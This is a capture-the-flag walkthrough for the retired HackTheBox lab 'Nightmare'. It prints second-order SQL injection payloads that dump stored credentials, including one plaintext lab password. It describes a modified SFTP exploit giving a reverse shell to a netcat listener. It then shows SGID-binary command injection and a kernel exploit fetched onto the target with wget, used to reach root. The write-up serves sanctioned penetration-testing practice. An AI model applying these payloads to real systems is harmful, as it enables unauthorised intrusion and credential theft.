<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">HacktheBox Nightmare Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-nightmare-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-12-28T13:31:31+00:00">December 28, 2018</time><time class="updated" datetime="2025-06-29T20:01:47+00:00">June 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Nightmare”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level</strong>: Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task</strong>: To find user.txt and root.txt file</span></p>
<p><span style="color: #000000;"><strong>Note</strong>: Since these labs are online available therefore they have a static IP. The IP of Nightmare is 10.10.10.66</span></p>
<h3><span style="color: #800000;">Penetrating Methodology</span></h3>
<ul>
<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
<li><span style="color: #000000;">Browsing IP address through HTTP</span></li>
<li><span style="color: #000000;">Checking for SQL injection vulnerability</span></li>
<li><span style="color: #000000;">Exploiting Second-Order Injection</span></li>
<li><span style="color: #000000;">Login through SSH</span></li>
<li><span style="color: #000000;">Login through SFTP</span></li>
<li><span style="color: #000000;">Exploiting SFTP to gain a reverse shell</span></li>
<li><span style="color: #000000;">Discovering files with SGID bit set</span></li>
<li><span style="color: #000000;">Privileges escalation using “sls”</span></li>
<li><span style="color: #000000;">Finding exploit for kernel</span></li>
<li><span style="color: #000000;">Making changes to the exploit</span></li>
<li><span style="color: #000000;">Getting root privilege using the exploit</span></li>
<li><span style="color: #000000;">Getting the root flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<p><span style="color: #000000;">Let’s start off with our basic nmap command to find out the open ports and services.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.10.10.66</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-CkSq5JcgD14/XCYhLOrijJI/AAAAAAAAb20/rjGA6K62Vp42TNHdOvJEpikRLPdAUD9GACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">The Nmap output shows us that there are 2 ports open: 80(HTTP), 2222(SSH)</span></p>
<p><span style="color: #000000;">We find that port 80 is running http, so we open the IP in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aNntoy2HqFw/XCYhO5WtWxI/AAAAAAAAb3o/WJirvjE3KwYsrYjPwlzziyFVRbdJDD40ACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">When we visit the webpage, we find a login page. After trying a few SQL injection commands we find that this page is vulnerable to “second-order SQL injection”. This means to exploit this vulnerability we have to register a user with our SQL injection query and then login with the same username.</span></p>
<p><span style="color: #000000;">First, we register a user with credentials “<strong>admin’): pass</strong>” using the register link on the login page. Now when we login using this user we get an SQL error on the web page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Mf5Xjvq68rc/XCYhQ8-jEKI/AAAAAAAAb4I/iDisH6IkwWkXHBup4xAtv-VpaWeJMtW2QCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">After finding the web application is vulnerable to Second Order SQL Injection. We now find the number of columns. There, we register a user with the following credentials:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username: admin ‘) order by 3#
Password: pass</pre>
<p><span style="color: #000000;">We keep the password same for the user we register.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-73XOomIvpI4/XCYhRLuC0MI/AAAAAAAAb4M/SMCCQI9PSLkSQqL04MNeHRxUMRMfZtM4gCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Now when we login, we get an SQL error that means the table has less than three columns. So we again register a user using the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">admin ‘) order by 2#</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-pICQvVwDnUY/XCYhRuUYv6I/AAAAAAAAb4Q/RojqvxofscYSGxg4GiQlIwN7ejO6I-oxgCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">When we login, we find that we do not have an SQL error that means the table has 2 columns.</span></p>
<p><span style="color: #000000;">Now we are going to find the version of SQL database it is running. To find the version of the database we are going to register with the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">admin') union select 1,@@version#</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_RJvJgW2Fb8/XCYhSPFT0hI/AAAAAAAAb4Y/ZMyoBFeni_wa-22188IqiFPOl6pum_K4QCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">After finding the version we now know that it is a MySQL database. Now we find the name of the database. To find the name of the database we register with the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">admin') union select 1,database()#</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-cO1K6IfRF50/XCYhRywwWeI/AAAAAAAAb4U/vHSyEW62Bf8bvxbRGdK4rpdGjtzLPajeACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now we get the database to be called “notes” but we want the names of all the databases on the server. So we register a user using the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">admin') union select 1,group_concat(distinct table_schema) from information_schema.tables#</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-JnRxsU_stwc/XCYhSnFQ-WI/AAAAAAAAb4c/ERluguGHz2EkP8vnmX1fHSHcXGxbMzq0gCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">We get another database called “sysadmin”; we find the table names inside “sysadmin”. To find the table names with we register the user with the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">admin') union select 1,group_concat(distinct table_name) from information_schema.columns where table_schema="sysadmin"#</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-v8iCSqXlHuw/XCYhSx2DSpI/AAAAAAAAb4g/ykq3u14KrhQfdtLpOCJCV95FhVwqR5dEACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We find two tables called “users” and “configs”; we now find the column name inside “users” table. To find the column names we register a user with the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">admin') union select 1,group_concat(distinct column_name) from information_schema.columns where table_schema="sysadmin" and table_name="users"#</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5sZcarsiDRE/XCYhLYpN0KI/AAAAAAAAb24/4CFB-HAM9RkSQUDrgyg-s6gdZRtgDBvmACLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now we find two columns called “username” and “password”. To find the data inside the columns we are going to register a user with the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">admin') union select 1,group_concat(username,0x7c,password,0x0a) from sysadmin.users#</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4AzvGpiwx74/XCYhLTVTC1I/AAAAAAAAb28/jR4SQodnJfwjU_rZ3YZqodpFmXD8EqngQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now we find different username passwords; we try to login through SSH using these credentials and find that we were able to login using the credentials “<strong>ftpuser:@whereyougo?”</strong> . We are unable to get a shell using SSH, instead, we tried to connect using sftp and were successfully able to login.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -p 2222 ftpuser@10.10.10.66
sftp -p 2222 ftpuser@10.10.10.66</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-rhDAnt0ZhQA/XCYhMKlDpsI/AAAAAAAAb3E/qtX8RjKxzcAxL8oI9pyLs3XW_d1w56p_QCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now as we are not able to get a shell using SSH, we tried to find sftp exploit and were able to find an exploit. You can download the exploit from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/SECFORCE/sftp-exploit">here</a></span>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mWvoeqDwmgE/XCYhMRXJHEI/AAAAAAAAb3I/-KfBJpV7NbgC1h40PEKW9hjcJGa-9vaAgCLcBGAs/s1600/13.1.png"/></span></p>
<p><span style="color: #000000;">We made changes to the exploit so that we can get a reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VSkC5qxEzyQ/XCYhLwA3kpI/AAAAAAAAb3A/jSHBiEeYyrUKnR4pkn2fz62S2CaVSYJ9gCLcBGAs/s1600/13.2.png"/></span></p>
<p><span style="color: #000000;">After making changes to the exploit, we set up our listener using netcat and then run the script.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python sftp-exploit.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-IN3ZuvfGFR8/XCYhM3JmmLI/AAAAAAAAb3M/O18zM6gJFKUKhbGfY-CEnS6Vio8nW1LbgCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">On our listener, we get a reverse shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 443</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TCcnUPvgKHw/XCYhM2zHU0I/AAAAAAAAb3Q/wIIMQnVJoOQ9X0NBBvzDxkyRAG_o76DrQCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">After getting the reverse shell we spawn a TTY shell. Then inside /home/decoder/ directory we find a directory called “test” and user called “user.txt”. As they belong to the “decoder” group, we find files that belong to the “decoder” group.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c "import pty; pty.spawn('/bin/bash')"
find / -group "decoder" 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-rN7RSi3mqB4/XCYhNdNjzbI/AAAAAAAAb3U/gVA09OSSQmYnLetX1pcuCQ6tK_tFfTkWQCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now running the sls command we find that it is a binary file that is running ls command. It also has an SGID bit set, so we can abuse this to escalate our privilege.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Ep9Khdi0EHc/XCYhNsgpqXI/AAAAAAAAb3Y/Wlafx8h_qoIk2dlfih1hwJ-emDgsBsTrQCLcBGAs/s1600/16.1.png"/></span></p>
<p><span style="color: #000000;">We use strings command to check the binary and find that it is using system function to execute the “ls” command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">strings /usr/bin/sls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-1dxPhV7Iwn0/XCYhN-IHQwI/AAAAAAAAb3c/6pX3xl3Di3Ub5E2fLGJ6I_fYo80ltj_fgCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now as ls command is executed inside system function; we are going to use -b argument to execute our command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sls -b '
bash -p'</pre>
<p><span style="color: #000000;">After getting a shell we run “id” command and find that we have spawned a shell as user “decoder”. We now can open “user.txt” file and find the first flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-C2QQGJRdQrE/XCYhOCwRTZI/AAAAAAAAb3k/X71eV3ayOU0-1Ze1swBfRjLy36e_slpLACLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Enumerating the system we now check the kernel version to check if there is an exploit available for privilege escalation.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">uname -a</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-qEvb4XOd5BQ/XCYhOOc1xWI/AAAAAAAAb3g/mmAJtIN1p3c5oRTEmpggrT949fokNPSjgCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">We find that the version of the kernel is vulnerable to this exploit <a style="color: #000000;" href="https://www.exploit-db.com/exploits/43418"><span style="color: #0000ff;">here</span></a>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-XKD9SQRdeZM/XCYhPXoKGBI/AAAAAAAAb3s/r6RpH1WJaPEpus5kje-UuKcjCyTEEB-pwCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">We download the code on our machine and compile it using gcc. Then we start python http server and send the compiled exploit file to the target machine. When we run the exploit we are unable to get a privileged shell as it shows an error saying that the kernel version is not recognized.</span></p>
<p><span style="color: #000000;">In Kali machine:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gcc -o priv 43418.c
python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;">On target machine:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.14.2/priv
chmod +x priv
./priv</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-eauNCHdVR8s/XCYhPYvgsOI/AAAAAAAAb3w/7LLAFeQX8O8ftmSmQipSEOq4RMK9PQfwgCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Now we have to make a few changes for the exploit to work. So we opened the c file again and make the changes.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-OjLp1f0jo7E/XCYhPipHUfI/AAAAAAAAb30/2-tWI5BLnaU9kGYeVIF1B6zsblnEoeRZQCLcBGAs/s1600/22.1.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ibdJrDiWWaQ/XCYhP31NohI/AAAAAAAAb34/rPR2NNGgbRUPzWXEiDzODCESRhc_k2qKACLcBGAs/s1600/22.2.png"/></span></p>
<p><span style="color: #000000;">Now we again compile and send the file to the target machine. This time when we run the file we get an error saying permission denied on set_groups.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Rix7c3J6xfA/XCYhQJzrC8I/AAAAAAAAb38/7eXvP5P1F5APF93JvOQCoPs40Ybib0EOwCLcBGAs/s1600/22.3.png"/></span></p>
<p><span style="color: #000000;">So we exited the shell and ran the exploit as ftpuser. As soon as we run the exploit we get a root shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-t4smxz-f-g4/XCYhQQ3umMI/AAAAAAAAb4A/RZ0imh2FxYAN5UNEmf_3Geb0owBsdbEAgCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">We go to /root directory and find a file called “root.txt”. When we open the file we get the final flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ozrTV7qlWJE/XCYhQ7PVXmI/AAAAAAAAb4E/071LZPdVfRQ9pX99RXOLy8GxiKQ7uLwgwCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
